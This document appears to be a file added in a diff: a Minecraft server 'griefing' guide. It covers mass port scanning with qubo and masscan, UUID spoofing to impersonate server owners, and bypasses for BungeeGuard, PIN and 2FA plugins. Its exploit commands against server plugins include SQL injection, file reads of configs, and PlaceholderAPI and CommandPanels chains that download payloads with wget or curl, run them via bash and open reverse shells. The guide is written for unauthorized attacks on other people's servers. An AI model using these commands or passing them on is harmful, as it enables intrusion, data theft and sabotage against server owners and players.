@@ -1,0 +1,107 @@
+To grief, we scan the internet for open minecraft server ports
+Many tools are available to use it, most common for minecraft is quboscanner or masscan
+I recommend using a VPS to scan since scanning on your pc is going to end up badly. (Websites going to block you, isp can contact you (police might contact you too), shit results from the scanning)
+Learn about networking here: https://www.cloudflare.com/learning/
+
+UUID Spoofing tutorial:
+1. Use a client with UUID Spoofing
+2. Find a ip-forwarding server by scanning or any other method
+2. Find the owner's nickname.
+3. If the server is Premium (bungeecord is premium): Toggle premium uuid and set your fake nick to the owners nick, For cracked server do the same but make sure premium uuid is set to No.
+4. Click spoof.
+5. Join the server with bungeehack on it
+6. Done
+If it doesnt work it means the server is using a custom uuid system. I Know alot russian servers do that, also another one that is using a custom uuid system is brodaci.net and ticocraft.com.
+
+Bypasses:
+
+You can bypass onlyproxyjoin by setting your ip to 0.0.0.0
+You can sometimes bypass SecuredNetwork by just spam joining. (New version called SafeNET is not bypassable)
+You can bypass UUIDSpoof - Fix by setting your name to zPirroZ3007 and your fake uuid to your desired uuid.
+You can bypass BungeeGuard on older versions is by using RBungeeExploit (by wrrulos) (https://github.com/wrrulos/RBungeeExploit) and use /connect [IP]. This exploit rarely works on any other spigot version than 1.8.8. 
+There are no IP-Whitelist bypasses and all of them are scams.
+Sometimes You can bypass PIN | 2FA Sytems by spoofing your nickname to yours and uuid to the owners one. You can also try bypassing by typing 0000, 1234, 4321, etc or just *
+
+Dumping methods:
+
+Litebans - Any version under 2.3.10 is vulnerable to sql injection, use /litebans sqlexec
+PlaceholderAPI - Javascript expansion with version before 2.1.0 is vulnerable to RCE made by me, heres how to use it: 
+/jsexp parse me new java.lang.ProcessBuilder("wget", "https://rentry.co/ui3i2/raw").start();
+/jsexp parse me new java.lang.ProcessBuilder("bash", "raw").start();
+Replace https://rentry.co/ui3i2/raw with your own payload link.
+Fun fact: this exploit was the most powerful one in the history!
+HolographicDisplays - Any version under 2.2.7 is vulnerable to LFI, use /hd create a AND /hd readtext ../../LuckPerms/config.yml or any other file
+CommandPanels - Unpatched on every verison, requires a plugin loader such as plugman or the PlaceholderAPI plugin.
+PlaceholderAPI CommandPanels:
+/cpi lmfao.jar https://transfer.sh/get/S3MLec/unnamed.jar
+/papi register ../../CommandPanels/panels/lmfao.jar.yml
+/papi parse me %rce_curl_-O_https://rentry.co/os7q7/raw%
+/papi parse me %rce_bash_raw%
+Replace https://rentry.co/os7q7/raw with your own payload link.
+Plugman CommandPanels:
+/cpi lmfao.jar https://transfer.sh/get/zCONva/SpigotRCE-1.0-SNAPSHOT-shaded.jar
+/plugman load CommandPanels/panels/lmfao.jar.yml
+Now type in chat:
+5170haxor linux yourreverseshellip
+or
+5170haxor windows yourreverseshellip
+WARNING: YOU MUST BIND YOUR REVERSE SHELL TO PORT 9001!
+
+PlugmanX - /plugman download direct RCELINKPLUGIN
+
+How to scan: 
+
+For Qubo:
+
+Semi ip-ranges ranges (/24 etc)
+Put this to scan file with no extension so just scan
+
+java -Dfile.encoding=UTF-8 -jar qubo.jar -ports 10000-10010,20000-20010,30000-30010,40000-40010,22222,11111,33333,44444,55555,65535,25500-25599,25600-25699 -th 8000 -ti 1250 -c 1 -noping -range $1
+
+Big ip-ranges (/16 etc)
+Put this to scanbig file with no extension so just scanbig
+
+java -Dfile.encoding=UTF-8 -jar qubo.jar -ports 10000-10010,20000-20010,30000-30010,40000-40010,22222,11111,33333,44444,55555,65535,25500-25599,25600-25699 -th 8000 -ti 1250 -c 1 -noping -range $1
+
+For Masscan:
+Put this to scanmasscan file with no extension so just scanmasscan
+
+masscan --wait 0 -p 1000-1010,2000-2010,3000-3010,4000-4010,5000-5010,6000-6010,7000-7010,8000-8010,9000-9010,10000-10010,10100-10110,11000-11010,12000-12010,13000-13010,14000-14010,15000-15010,16000-16010,17000-17010,18000-18010,19000-19010,20000-20010,20100-20110,21000-21010,22000-22010,23000-23010,24000-24010,25000-25010,26000-26010,27000-27010,28000-28010,29000-29010,30000-30010,30100-30110,31000-31010,32000-32010,33000-33010,34000-34010,35000-35010,36000-36010,37000-37010,38000-38010,39000-39010,40000-40010,41000-41010,42000-42010,43000-43010,44000-44010,45000-45010,46000-46010,47000-47010,48000-48010,49000-49010,50000-50010,51000-51010,52000-52010,53000-53010,54000-54010,55000-55010,56000-56010,57000-57010,58000-58010,59000-59010,60000-60010,61000-61010,62000-62010,63000-63010,64000-64010,65000-65010,11111,12345,12346,0-20,100-110,200-205,212,300-305,400-405,500-505,600-605,666,700-705,777,800-805,900-905,6666,7777,13370,13377,13337,23456,23467,23457,27777,27017,6379,65535,123,321,4321,54321,4321,321,5432,25100-25110,3535,35350,2137,2115,21115,25550-25600 --max-rate 70000 -oL outputmasscan.txt $1
+
+How to scan whole asn scan at once:
+
+apt-get install whois
+
+First this
+put ASN in asn.txt
+Add this to ranger.sh file into a linux system, use wsl if you use windows
+
+while read asn; do
+        whois -h whois.radb.net -- "-i origin ${1:-$asn}" | grep -Eo "([0-9.]+){4}/[0-9]+" >> ranges.lst
+done < asn.txt
+
+type: sh ranger.sh
+
+Now select qubo or masscan and paste into formatter.sh
+type: sh formatter.sh
+
+FOR QUBO
+
+with open("ranges.lst", "r") as f:
+    for line in f:
+        line = line.strip()
+        print(line)
+        with open("formatted", "a") as f:
+            f.write("./scan " + line + "\n")
+
+FOR MASSCAN
+lines = []
+with open("ranges.lst", "r") as f:
+    for line in f:
+        line = line.strip()
+        lines.append(line)
+        with open("masscanformatted", "a") as f:
+            f.write("./scanmasscan " + ",".join(lines) + "\n")
+
+now type: sh formatted or sh masscanformatted
+DONT FORGET TO REMOVE OLD ranges.lst AND asn.txt AFTER SCANNING!
